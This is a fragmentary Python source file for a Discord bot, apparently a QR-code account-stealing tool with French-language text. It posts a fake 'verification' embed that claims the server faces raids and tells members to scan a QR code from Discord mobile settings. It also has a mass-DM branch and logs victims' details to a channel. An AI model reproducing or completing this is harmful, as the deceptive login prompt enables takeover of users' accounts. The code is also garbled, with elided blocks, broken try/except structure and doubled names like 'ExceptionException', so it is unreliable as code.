...
async def start(ctx):
    ...
    try:
        ...
        logs_channel = None
    verification = Button(label="Vérifie Moi", style=ButtonStyle.blurple)
                    ...
                    if mass_dm == 2 or mass_dm == 3:
                        try:
                            ...
                            if logs_channel:
                                ...
                                embed_fdm.set_thumbnailset_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user.id}/{user.avatar}.png")
                                await logs_channel.send(embed=embed_fdm)
                        except ExceptionException as e:
                            print(f"{y}[{Fore.LIGHTRED_EX}!{y}]{w} Mass DM failed: {e}")
                            pass

        #Embed Creation
        asyncio.create_task(c.run())
        embed_qr = nextcord.Embed(title="__**Bonjour, êtes vous humain? découvrons le!**__", description="Nous avons installé une vérification par ce que notre serveur subis de plus en plus de raid.\n\n**Veuillez suivre ces étapes pour terminer votre vérification**:\n1️⃣ *Ouvrez l'application\ndiscord Mobile*\n2️⃣ *Aller dans les paramètre*\n3️⃣ *Choisissez l'option\n\"Scanner le QR code\"*\n4️⃣ *Scannez le QR code ci-dessous*", color=5003474)
        embed_qr.set_footer(text="Note: le captcha expires en 2 minutes")
    ...
    embed = nextcord.Embed(title="**Verification requise!**", description="🔔 Pour avoir accès au salon, vous devez effectuer la vérification\n🧿 Appuyez sur le bouton ci-dessous", color=5003474)
